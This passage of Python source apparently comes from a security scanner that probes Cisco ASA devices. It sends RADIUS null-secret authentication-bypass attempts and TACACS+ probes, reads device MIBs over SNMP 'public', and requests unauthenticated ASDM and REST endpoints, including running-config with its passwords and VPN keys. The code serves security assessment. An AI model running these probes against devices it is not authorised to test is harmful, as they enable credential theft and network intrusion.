    Probe Cisco AAA attack surface: TACACS+, RADIUS, and SNMP AAA config exposure.

    Chapter 7 (ASA All-in-One): TACACS+ on TCP/49; RADIUS auth on UDP/1645 or 1812.
    An unauthenticated TACACS+ AUTHEN_START reply confirms daemon reachable; no NAS
    pre-registration gate required by default.  RADIUS Access-Accept on an empty-password
    probe with null shared secret = authentication bypass.  CISCO-TACACS-MIB readable
    via SNMPv1 public exposes AAA server IP/status to any host on the management VLAN.
    """
    findings: list = []

    # --- TACACS+ TCP/49 : send AUTHEN_START, check for any daemon reply -----
    # Header (12 bytes): version=0xC1 type=1(AUTHEN) seq_no=1 flags=0
    #                    session_id(4B) body_length(4B)
    # AUTHEN_START body (8 bytes): action=1(LOGIN) priv_lvl=0 authen_type=1(ASCII)
    #                              authen_service=1(LOGIN) user_len=0 port_len=0
    #                              rem_addr_len=0 data_len=0
    try:
        body = struct.pack('!BBBBBBBB',
                           0x01, 0x00, 0x01, 0x01,   # action, priv_lvl, type, svc
                           0x00, 0x00, 0x00, 0x00)    # user/port/remaddr/data lengths
        hdr = struct.pack('!BBBBII',
                          0xC1, 0x01, 0x01, 0x00,     # version, type, seq_no, flags
                          0xDEADBEEF,                  # session_id (arbitrary)
                          len(body))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, 49))
        sock.sendall(hdr + body)
        resp = sock.recv(256)
        sock.close()
        if resp and len(resp) >= 12:
            findings.append({
                'severity': 'HIGH',
                'title':    'TACACS_PLUS_RESPONSIVE',
                'detail':   (f'TACACS+ daemon on {host}:49 replied to AUTHEN_START '
                             f'(version=0xC1 type=AUTHEN seq=1); '
                             f'response type=0x{resp[1]:02x} seq={resp[2]}; '
                             f'daemon reachable without NAS pre-registration'),
                'host':     host,
                'port':     49,
            })
    except Exception:
        pass

    # --- RADIUS UDP/1812 (and 1645 fallback) : empty-password Access-Request -
    # RFC 2865: User-Password = MD5(secret + authenticator) XOR password_padded.
    # Null shared-secret probe: secret=b"", password=b"\x00"*16 (empty string padded).
    import hashlib as _hashlib
    authenticator = b'\x00' * 16
    username      = b'probe'
    _pad          = _hashlib.md5(b'' + authenticator).digest()   # MD5("" + auth)
    user_pw       = bytes(a ^ b for a, b in zip(_pad, b'\x00' * 16))
    attr_uname    = bytes([1, 2 + len(username)]) + username
    attr_upw      = bytes([2, 2 + len(user_pw)]) + user_pw
    attr_nas_ip   = bytes([4, 6]) + socket.inet_aton('127.0.0.1')
    attrs         = attr_uname + attr_upw + attr_nas_ip
    radius_pkt    = struct.pack('!BBH16s', 1, 1, 20 + len(attrs), authenticator) + attrs
    for radius_port in (1812, 1645):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(radius_pkt, (host, radius_port))
            data, _ = s.recvfrom(4096)
            s.close()
            if data and data[0] == 2:   # code 2 = Access-Accept
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'RADIUS_EMPTY_PASSWORD_ACCEPTED',
                    'detail':   (f'RADIUS at {host}:{radius_port} returned Access-Accept '
                                 f'for Access-Request with empty password and null shared secret; '
                                 f'authentication bypass; RFC 2865 shared-secret absent or blank'),
                    'host':     host,
                    'port':     radius_port,
                })
                break
        except Exception:
            pass

    # --- SNMP: cTacacsServerStatus (CISCO-TACACS-MIB) -----------------------
    # OID 1.3.6.1.4.1.9.9.56.1.1.1.1.6 — cTacacsServerStatus
    raw = _snmp_get_raw(host, 'public', '1.3.6.1.4.1.9.9.56.1.1.1.1.6', 161, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        status_str = f'status={val}' if val is not None else 'OID readable'
        findings.append({
            'severity': 'HIGH',
            'title':    'TACACS_CONFIG_VIA_SNMP',
            'detail':   (f'CISCO-TACACS-MIB cTacacsServerStatus {status_str}; '
                         f'OID 1.3.6.1.4.1.9.9.56.1.1.1.1.6 readable via SNMPv1 '
                         f'community=public; AAA server topology exposed unauthenticated'),
            'host':     host,
            'port':     161,
        })

    return findings


# ---------------------------------------------------------------------------
# Extended Cisco SNMP MIB surface — flash FS, ping MIB, ifTable, ARP table
# ---------------------------------------------------------------------------

def probe_cisco_snmp_extended(host: str, port: int = 161, timeout: float = 5.0) -> list:
    """
    Extended Cisco SNMP MIB exposure beyond the base probe_snmp() check.

    Chapter 5 (ASA All-in-One): SNMP used for polling device status, flash management,
    and netflow/syslog correlation.  The Cisco proprietary MIBs expose flash filesystem
    layout (firmware pivoting), the ping MIB enables SNMP-triggered ICMP from the device
    (internal reachability mapping), standard ifTable leaks interface topology and MACs,
    and atTable hands over the full ARP cache enabling L2 neighbor enumeration.

    Uses existing _snmp_get_raw helper (BER-encoded SNMPv1 GET, community='public').
    """
    findings: list = []
    community = 'public'

    # Cisco Flash file-system table (CISCO-FLASH-MIB)
    # OID 1.3.6.1.4.1.9.9.10.1.1.3.1 — ciscoFlashFileSystemTable (size/name/status)
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.10.1.1.3.1', port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        sample = repr(vals[0][:80]) if vals else 'entry returned'
        findings.append({
            'severity': 'HIGH',
            'title':    'CISCO_FLASH_FS_VIA_SNMP',
            'detail':   (f'CISCO-FLASH-MIB ciscoFlashFileSystemTable accessible; '
                         f'OID 1.3.6.1.4.1.9.9.10.1.1.3.1; sample={sample}; '
                         f'flash filesystem structure (name/size/status) readable; '
                         f'enables firmware version mapping and image-replacement staging'),
            'host':     host,
            'port':     port,
        })

    # Cisco Ping MIB (CISCO-PING-MIB)
    # OID 1.3.6.1.4.1.9.9.16.1.1 — ciscoPingTable entry
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.16.1.1', port, timeout)
    if raw is not None:
        findings.append({
            'severity': 'HIGH',
            'title':    'CISCO_PING_MIB_READABLE',
            'detail':   (f'CISCO-PING-MIB ciscoPingTable accessible; '
                         f'OID 1.3.6.1.4.1.9.9.16.1.1; '
                         f'SNMP SET on this MIB triggers ICMP probes from device; '
                         f'enables internal network reachability mapping via device pivot'),
            'host':     host,
            'port':     port,
        })

    # Standard MIB-II ifTable (RFC 1213)
    # OID 1.3.6.1.2.1.2.2.1 — interface table (name, type, speed, MAC, status)
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.2.2.1', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        iface_str = f'ifIndex={val}' if val is not None else 'interface entry returned'
        findings.append({
            'severity': 'MEDIUM',
            'title':    'INTERFACE_TABLE_SNMP',
            'detail':   (f'MIB-II ifTable readable; OID 1.3.6.1.2.1.2.2.1; '
                         f'{iface_str}; interface names, types, speeds, and MAC addresses '
                         f'readable via SNMPv1 community=public; full L2 topology disclosed'),
            'host':     host,
            'port':     port,
        })

    # Standard MIB-II atTable / ARP cache (RFC 1213)
    # OID 1.3.6.1.2.1.3.1.1.2 — atPhysAddress (MAC addresses in ARP table)
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.3.1.1.2', port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        try:
            mac_hex = vals[0].encode('latin-1').hex(':') if vals else 'entry returned'
        except Exception:
            mac_hex = 'entry returned'
        findings.append({
            'severity': 'HIGH',
            'title':    'ARP_TABLE_VIA_SNMP',
            'detail':   (f'MIB-II atTable ARP entries readable; OID 1.3.6.1.2.1.3.1.1.2; '
                         f'sample MAC={mac_hex}; '
                         f'full ARP cache maps IP-to-MAC for all adjacent hosts; '
                         f'enables L2 neighbor enumeration and ARP poisoning target selection'),
            'host':     host,
            'port':     port,
        })

    return findings


# ---------------------------------------------------------------------------
# Cisco ASA ASDM management portal access
# ---------------------------------------------------------------------------

def probe_cisco_asdm_access(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Probe Cisco ASA ASDM web management portal for unauthenticated access.

    Chapter 4 (ASA All-in-One): ASDM is the primary GUI management interface.
    Enabled via 'http server enable' + 'http <subnet> <interface>'.
    URL https://<ASA>/admin redirects to /admin/public/index.html (Java launcher).
    ASA acts as SSL web server; ASDM auth enforced by 'aaa authentication http
    console' — absent on misconfigured devices, exposing the exec REST surface.

    ASDM REST exec endpoint (/admin/exec/show+<cmd>) returns live IOS output
    without credentials on misconfigured ASA versions; running-config endpoint
    discloses all passwords, ACLs, VPN pre-shared keys, and SNMP communities.
    """
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    def _get(path: str) -> tuple:
        """Return (status_code, body_str) or (None, None) on connection failure."""
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                body = r.read(8192).decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body
        except Exception:
            return None, None

    # ASDM launcher page — /admin/public/index.html
    # Ch4: 'https://<ASA>/admin' redirects here; Java launcher + device identity.
    # 200 = management plane reachable without source-IP ACL gate.
    status, body = _get('/admin/public/index.html')
    if status == 200 and body and (
            'asdm' in body.lower() or 'cisco' in body.lower()
            or 'java' in body.lower() or 'adaptive' in body.lower()):
        findings.append({
            'severity': 'HIGH',
            'title':    'ASDM_PORTAL_EXPOSED',
            'detail':   (f'ASDM launcher page /admin/public/index.html returned HTTP 200; '
                         f'management interface reachable without source-IP restriction; '
                         f'exposes Java launcher and device identity; '
                         f'remediation: add "http <acl-subnet> <iface>" to restrict access'),
            'host':     host,
            'port':     port,
        })

    # ASDM REST exec: show version — unauthenticated device info
    # /admin/exec/show+version returns live IOS exec output if auth not enforced.
    status, body = _get('/admin/exec/show+version')
    if status == 200 and body and len(body) > 40:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ASDM_REST_UNAUTH',
            'detail':   (f'ASDM REST exec /admin/exec/show+version returned HTTP 200 '
                         f'({len(body)} bytes) without credentials; full device management '
                         f'surface accessible unauthenticated; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # ASDM REST exec: show running-config — full credential and topology disclosure
    status, body = _get('/admin/exec/show+running-config')
    if status == 200 and body and (
            'hostname' in body or 'interface' in body or 'password' in body
            or 'enable' in body or 'username' in body):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'RUNNING_CONFIG_EXPOSED',
            'detail':   (f'ASDM REST exec /admin/exec/show+running-config returned HTTP 200 '
                         f'containing device configuration; all credentials, ACLs, VPN '
                         f'pre-shared keys, and SNMP communities visible unauthenticated; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # ASDM config endpoint — alternate configuration management access path
    status, body = _get('/admin/config')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'HIGH',
            'title':    'ASDM_CONFIG_ENDPOINT',
            'detail':   (f'ASDM /admin/config endpoint accessible (HTTP 200, {len(body)} bytes); '
                         f'configuration management surface reachable without authentication; '
                         f'sample: {body[:80].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    return findings


# ---------------------------------------------------------------------------
# Cisco ASA crypto key and SSL/TLS configuration exposure
# ---------------------------------------------------------------------------

def probe_cisco_crypto_config(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Probe Cisco ASA for crypto key and SSL/TLS configuration exposure via
    the ASDM REST exec interface.

    Chapter 5 (ASA All-in-One): 'show crypto key mypubkey rsa' exposes RSA
    key-pair name, usage flags, modulus size, and Base64 public key blob used
    for SSH and SSL sessions.  'show ssl' reveals server-version, client-version,
    and cipher-suite policy. Deprecated protocols (SSLv3, TLSv1.0, TLSv1.1)
    remain configurable and detectable via this endpoint.

    Chapter 21 (PKI): 'show crypto pki certificates' returns full cert chain
    (subject DN, issuer DN, validity window, serial, public key type).
    'show crypto pki trustpoints' discloses trustpoint names, enrollment method
    (SCEP/manual/local-CA), and associated CA DN — exposes CA topology.

    All probes target the ASDM REST exec endpoint; 401/403 responses indicate
    auth is enforced and no findings are generated.
    """
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    def _get(path: str) -> tuple:
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                body = r.read(8192).decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(2048).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body
        except Exception:
            return None, None

    # RSA public key material — /admin/exec/show+crypto+key+mypubkey+rsa
    # Ch5: output includes key name, usage flags, modulus size, and Base64
    # public key blob. Confirms key-pair for SSH/SSL; leaks device public key.
    status, body = _get('/admin/exec/show+crypto+key+mypubkey+rsa')
    if status == 200 and body and (
            'key name' in body.lower() or 'usage' in body.lower()
            or 'modulus' in body.lower() or 'key data' in body.lower()):
        findings.append({
            'severity': 'MEDIUM',
            'title':    'RSA_KEY_EXPOSED',
            'detail':   (f'show crypto key mypubkey rsa returned HTTP 200 via ASDM exec; '
                         f'RSA public key material (name, usage, modulus, key data) disclosed; '
                         f'enables device fingerprinting and confirms key-pair for SSH/SSL; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # SSL version and cipher configuration — /admin/exec/show+ssl
    # Ch5/Ch22: 'show ssl' returns server-version, client-version, cipher list,
    # DH group. SSLv3 / TLSv1.0 / TLSv1.1 in output = deprecated proto in use.
    status, body = _get('/admin/exec/show+ssl')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'HIGH',
            'title':    'SSL_CONFIG_EXPOSED',
            'detail':   (f'show ssl returned HTTP 200 via ASDM exec; '
                         f'SSL/TLS version and cipher-suite policy readable unauthenticated; '
                         f'sample: {body[:160].strip()!r}'),
            'host':     host,
            'port':     port,
        })
        body_lower = body.lower()
        deprecated = [p for p in ('sslv3', 'tlsv1.0', 'tlsv1.1') if p in body_lower]
        if deprecated:
            findings.append({
                'severity': 'HIGH',
                'title':    'DEPRECATED_SSL_TLS_CONFIGURED',
                'detail':   (f'Deprecated protocol(s) {deprecated} present in "show ssl" output; '
                             f'SSLv3 (CVE-2014-3566 POODLE) and TLSv1.0/1.1 (BEAST/CRIME) are '
                             f'cryptographically broken; NIST SP 800-52r2 mandates TLSv1.2+; '
                             f'sample: {body[:120].strip()!r}'),
                'host':     host,
                'port':     port,
            })

    # PKI certificate chain — /admin/exec/show+crypto+pki+certificates
    # Ch21: returns subject DN, issuer DN, validity window, serial, public-key
    # type for all installed certs including CA certificate and identity cert.
    status, body = _get('/admin/exec/show+crypto+pki+certificates')
    if status == 200 and body and (
            'certificate' in body.lower() or 'subject' in body.lower()
            or 'issuer' in body.lower() or 'validity' in body.lower()):
        findings.append({
            'severity': 'HIGH',
            'title':    'PKI_CERT_CHAIN_EXPOSED',
            'detail':   (f'show crypto pki certificates returned HTTP 200 via ASDM exec; '
                         f'full PKI certificate chain (subject, issuer, validity, serial, '
                         f'public-key type) accessible unauthenticated; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # PKI trustpoints — /admin/exec/show+crypto+pki+trustpoints
    # Ch21: trustpoint names, enrollment method (SCEP/manual/local-CA), and
    # associated CA DN. Enables CA hierarchy and enrollment topology enumeration.
    status, body = _get('/admin/exec/show+crypto+pki+trustpoints')
    if status == 200 and body and (
            'trustpoint' in body.lower() or 'enrollment' in body.lower()
            or 'subject-name' in body.lower()):
        findings.append({
            'severity': 'MEDIUM',
            'title':    'PKI_TRUSTPOINTS_EXPOSED',
            'detail':   (f'show crypto pki trustpoints returned HTTP 200 via ASDM exec; '
                         f'trustpoint names, enrollment method (SCEP/manual), and CA identity '
                         f'readable unauthenticated; enables CA hierarchy enumeration; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    return findings


def probe_cisco_threat_detection(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe ASA threat-detection and shun-state exposure via ASDM exec and REST API.

    Ch17 (Cisco ASA All-in-One, 3e): Threat Detection operates at two levels —
    basic threat detection tracks drop rates and generates syslog 733100 alerts;
    scanning threat detection tracks per-host and per-port statistics, maintains
    top-N attacker/victim tables, and can optionally shun (block) detected scanners.
    The shun table lists actively blocked source IPs with expiry timestamps.
    Unauthenticated access to these endpoints reveals live attack metrics, drop
    statistics, and the set of addresses the ASA has autonomously blocked.
    """
    import urllib.request
    import ssl

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'
    findings: list = []

    def _get(path: str):
        try:
            req = urllib.request.Request(
                f'{base}{path}',
                headers={'Accept': 'application/json, text/plain, */*',
                         'User-Agent': 'Mozilla/5.0'},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except Exception:
            return None, ''

    # /admin/exec/show+threat-detection+statistics
    # Ch17: scanning threat detection tracks per-host/port stats; basic threat
    # detection tracks burst/average drop rates across 20-min/1-hr/8-hr windows.
    # Output includes "Average" and "Current" rates, host-drop and ACL-drop counts.
    status, body = _get('/admin/exec/show+threat-detection+statistics')
    if status == 200 and body and (
            'average' in body.lower() or 'current' in body.lower()
            or 'drop' in body.lower() or 'threat' in body.lower()):
        findings.append({
            'severity': 'HIGH',
            'title':    'ASA_THREAT_DETECTION_STATS',
            'detail':   (f'show threat-detection statistics returned HTTP 200 via ASDM exec; '
                         f'scanning/attack metrics (per-host drop rates, burst averages, '
                         f'top-attacker tables) visible unauthenticated; '
                         f'Ch17: scanning threat detection maintains live attacker/victim lists; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # /admin/exec/show+threat-detection+rate
    # Ch17: basic threat detection rate statistics — burst and average rates over
    # 20-min, 1-hr, and 8-hr windows for ACL drops, bad packets, conn limits, DoS,
    # firewall, inspect drops, interface, scanning, syn-attack, and other categories.
    status, body = _get('/admin/exec/show+threat-detection+rate')
    if status == 200 and body and (
            'rate' in body.lower() or 'burst' in body.lower()
            or 'avg' in body.lower() or 'drop' in body.lower()):
        findings.append({
            'severity': 'HIGH',
            'title':    'ASA_THREAT_DETECTION_RATE',
            'detail':   (f'show threat-detection rate returned HTTP 200 via ASDM exec; '
                         f'burst/average drop-rate statistics across 20-min/1-hr/8-hr windows '
                         f'visible unauthenticated; exposes live traffic anomaly baseline; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # /api/threat-detection/statistics — REST API endpoint (ASA 9.x+)
    # Returns JSON-encoded threat statistics directly; no exec wrapper needed.
    status, body = _get('/api/threat-detection/statistics')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ASA_THREAT_STATS_API_UNAUTH',
            'detail':   (f'REST API /api/threat-detection/statistics returned HTTP 200 '
                         f'without authentication; structured threat statistics exposed '
                         f'directly via REST; Ch17: includes per-category drop rates and '
                         f'scanning detection tables; sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # Shun table — /admin/exec/show+shun
    # Ch17: Attack Response Controller distributes shun (block) commands to the ASA
    # based on IPS signature actions; the shun table lists source IPs with
    # destination, protocol, and port triples that are currently hard-blocked.
    # Exposure reveals active attacker IPs and the ASA's autonomous response state.
    status, body = _get('/admin/exec/show+shun')
    if status == 200 and body:
        body_lower = body.lower()
        if 'host-drop' in body_lower or 'shun' in body_lower or 'src' in body_lower:
            findings.append({
                'severity': 'HIGH',
                'title':    'ASA_SHUNNED_HOSTS_EXPOSED',
                'detail':   (f'show shun returned HTTP 200 via ASDM exec; active attacker '
                             f'shun list (hard-blocked IPs with src/dst/proto/port) visible '
                             f'unauthenticated; Ch17: shun entries placed by IPS Attack Response '
                             f'Controller or manual shun commands; '
                             f'sample: {body[:120].strip()!r}'),
                'host':     host,
                'port':     port,
            })

    return findings


def probe_cisco_dynamic_access_policy(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe ASA Dynamic Access Policy (DAP) and inbound ACL exposure.

    Ch22 (Cisco ASA All-in-One, 3e): DAP generates per-session access policies by
    aggregating endpoint posture data (Host Scan, CSD), AAA attributes (RADIUS/LDAP),
    and locally defined DAPR records. The DAP configuration is stored as an XML file
    (DAP.XML) in flash. DAP records define Boolean selection criteria and access-control
    attributes (network ACLs, URL/application/port filters, bookmarks) applied to
    matching VPN sessions. Unauthenticated access to these endpoints exposes the full
    policy framework governing remote-access authorization decisions.
    """
    import urllib.request
    import ssl
    import re

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'
    findings: list = []

    def _get(path: str):
        try:
            req = urllib.request.Request(
                f'{base}{path}',
                headers={'Accept': 'application/json, text/plain, */*',
                         'User-Agent': 'Mozilla/5.0'},
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except Exception:
            return None, ''

    # /api/dap/records — REST API for DAP records
    # Ch22: DAPR records contain AAA and endpoint selection criteria plus
    # access-control attributes (network ACLs, URL filters, app/port filters,
    # bookmarks). DfltAccessPolicy is always present; additional records define
    # posture-conditional access grants and restrictions.
    status, body = _get('/api/dap/records')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ASA_DAP_RECORDS_UNAUTH',
            'detail':   (f'REST API /api/dap/records returned HTTP 200 without authentication; '
                         f'Dynamic Access Policy records (DAPR) exposed — contains AAA/endpoint '
                         f'selection criteria and per-session ACL/filter/bookmark policy attributes; '
                         f'Ch22: DAP governs VPN authorization; exposure reveals posture bypass '
                         f'conditions; sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # /admin/exec/show+running-config+dap
    # Ch22: DAP config section in running-config includes DAP.XML content, DAPR names,
    # selection LUA expressions, and applied action attributes. Reveals the complete
    # conditional authorization logic for all remote-access sessions.
    status, body = _get('/admin/exec/show+running-config+dap')
    if status == 200 and body and (
            'dap' in body.lower() or 'dynamic-access-policy' in body.lower()
            or 'xml' in body.lower() or 'lua' in body.lower()):
        findings.append({
            'severity': 'HIGH',
            'title':    'ASA_DAP_CONFIG_EXPOSED',
            'detail':   (f'show running-config dap returned HTTP 200 via ASDM exec; '
                         f'DAP XML configuration (DAPR selection criteria, LUA expressions, '
                         f'applied ACL/filter attributes) readable unauthenticated; '
                         f'Ch22: reveals posture-check conditions and authorization policy logic; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # /api/access/in — inbound ACL rules via REST API
    # Ch22 / Ch8: inbound access-control lists define which traffic is permitted
    # or denied into a security context. Exposure reveals the full filter rule set
    # applied to inbound interfaces including any permit-all rules.
    status, body = _get('/api/access/in')
    if status == 200 and body and len(body) > 20:
        findings.append({
            'severity': 'HIGH',
            'title':    'ASA_INBOUND_ACL_UNAUTH',
            'detail':   (f'REST API /api/access/in returned HTTP 200 without authentication; '
                         f'inbound access-control list rules exposed; full permit/deny rule set '
                         f'readable — reveals security perimeter policy; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })
        # Check for unrestricted permit-any-any rule
        if re.search(r'permit\s+ip\s+any\s+any', body, re.IGNORECASE):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'PERMIT_ANY_ANY_RULE',
                'detail':   (f'Inbound ACL at /api/access/in contains "permit ip any any"; '
                             f'unrestricted traffic rule allows all IP traffic inbound — '
                             f'firewall policy provides no ingress filtering; '
                             f'sample: {body[:200].strip()!r}'),
                'host':     host,
                'port':     port,
            })

    return findings


def probe_cisco_anyconnect_profile(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe AnyConnect client profile endpoints on Cisco ASA SSL VPN.

    Ch23: AnyConnect profiles (AnyConnectProfile.xml) are pushed from the ASA
    to connecting clients via /CACHE/stc/1/profiles/. The profile contains the
    headend server list, split-tunnel preferences, and enforcement settings
    including AlwaysOnVPN. An accessible profile directory or default profile
    discloses VPN topology and enforcement posture to any unauthenticated client.
    """
    import ssl
    import urllib.request
    import re as _re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'AnyConnect'})
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read().decode('utf-8', errors='replace')
        except Exception:
            return None, ''

    # /CACHE/stc/1/profiles/ — AnyConnect profile directory listing
    # Ch23: ASA serves AnyConnect package components (images, profiles) under
    # /CACHE/stc/1/. Profile XML files are pushed to clients on connect. An
    # open directory listing exposes all deployed client profile names.
    status, body = _get('/CACHE/stc/1/profiles/')
    if status == 200 and body and len(body) > 10:
        findings.append({
            'severity': 'HIGH',
            'title':    'ANYCONNECT_PROFILE_DIR',
            'detail':   (f'GET /CACHE/stc/1/profiles/ returned HTTP 200 without authentication; '
                         f'AnyConnect client profile directory accessible — lists all deployed '
                         f'profile XML filenames; Ch23: profiles contain headend server list, '
                         f'split-tunnel config, and VPN enforcement settings; '
                         f'sample: {body[:120].strip()!r}'),
            'host':     host,
            'port':     port,
        })

    # /CACHE/stc/1/profiles/profile.xml — default AnyConnect profile
    # Ch23 Example 23-13: AnyConnectProfile.xml defines ClientInitialization
    # (AlwaysOnVPN, LocalLanAccess, AutoReconnect) and ServerList entries.
    # Readable without auth discloses corporate VPN architecture and policy posture.
    status, body = _get('/CACHE/stc/1/profiles/profile.xml')
    if status == 200 and body and ('<AnyConnectProfile' in body or 'AnyConnectProfile' in body
                                    or '<ServerList' in body or '<ClientInitialization' in body):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ANYCONNECT_PROFILE_EXPOSED',
            'detail':   (f'GET /CACHE/stc/1/profiles/profile.xml returned HTTP 200 without '
                         f'authentication; VPN client profile readable — contains headend server '
                         f'list, client initialization preferences, and tunnel enforcement config; '
                         f'Ch23: profile discloses corporate VPN topology and client policy posture; '
                         f'sample: {body[:200].strip()!r}'),
            'host':     host,
            'port':     port,
        })

        # Parse AlwaysOnVPN enforcement setting
        # Ch23: AlwaysOnVPN (or AlwaysOn) enforces that the AnyConnect client
        # must remain connected; if false or absent, users can disable the VPN
        # and route traffic outside the tunnel entirely.
        always_on_match = _re.search(
            r'<AlwaysOn[^>]*>([^<]+)</AlwaysOn>|AlwaysOnVPN[^>]*>([^<]+)<',
            body, _re.IGNORECASE
        )
        if always_on_match:
            value = (always_on_match.group(1) or always_on_match.group(2) or '').strip().lower()
            if value in ('false', '0', 'no', ''):
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'ANYCONNECT_ALWAYS_ON_DISABLED',
                    'detail':   (f'AnyConnect profile at /CACHE/stc/1/profiles/profile.xml has '
                                 f'AlwaysOnVPN set to false; VPN enforcement not active — users '
                                 f'can disconnect the AnyConnect client and route all traffic '
                                 f'outside the tunnel without restriction; '
                                 f'Ch23: split tunneling risk compounds when always-on is disabled'),
                    'host':     host,
                    'port':     port,
                })
        else:
            # AlwaysOn element absent — enforcement not configured
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ANYCONNECT_ALWAYS_ON_DISABLED',
                'detail':   (f'AnyConnect profile at /CACHE/stc/1/profiles/profile.xml does not '
                             f'include an AlwaysOnVPN element; VPN not enforced — traffic escapes '
                             f'when the VPN session is down or manually disconnected; '
                             f'Ch23: absence of always-on enforcement permits uncontrolled '
                             f'cleartext traffic from remote endpoints'),
                'host':     host,
                'port':     port,
            })

        # Parse split tunneling configuration
        # Ch20/Ch23: split-tunnel-policy tunnelspecified or SplitTunneling element
        # in the profile means only matched networks are encrypted; remaining
        # traffic exits the client unencrypted through the local gateway.
        split_match = _re.search(
            r'<SplitTunnel[^>]*>|split[-_]tunnel|SplitInclude|SplitExclude',
            body, _re.IGNORECASE
        )
        if split_match:
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ANYCONNECT_SPLIT_TUNNEL',
                'detail':   (f'AnyConnect profile at /CACHE/stc/1/profiles/profile.xml contains '
                             f'split tunneling configuration ({split_match.group(0)!r}); '
                             f'only matched subnets are encrypted through the VPN — remaining '
                             f'traffic bypasses the tunnel and exits the endpoint unencrypted; '
                             f'Ch20/Ch23: split tunneling exposes the remote host to local network '
                             f'attacks while simultaneously connected to corporate resources'),
                'host':     host,
                'port':     port,
            })

    return findings


def probe_cisco_clientless_vpn_bookmarks(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe clientless SSL VPN portal and bookmark endpoints on Cisco ASA.

    Ch22: The clientless SSL VPN portal (/+CSCOE+/portal.html) presents
    authenticated users with bookmarks — links to internal application servers
    (HTTP, HTTPS, CIFS, RDP) that the ASA proxies on behalf of the client.
    If the portal or bookmark list is reachable without authentication, internal
    application URLs, network addresses, and session state are exposed. The id=
    parameter on portal.html provides an IDOR surface for cross-user bookmark
    access.
    """
    import ssl
    import urllib.request
    import re as _re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        try:
            req = urllib.request.Request(
                url,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html'}
            )
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
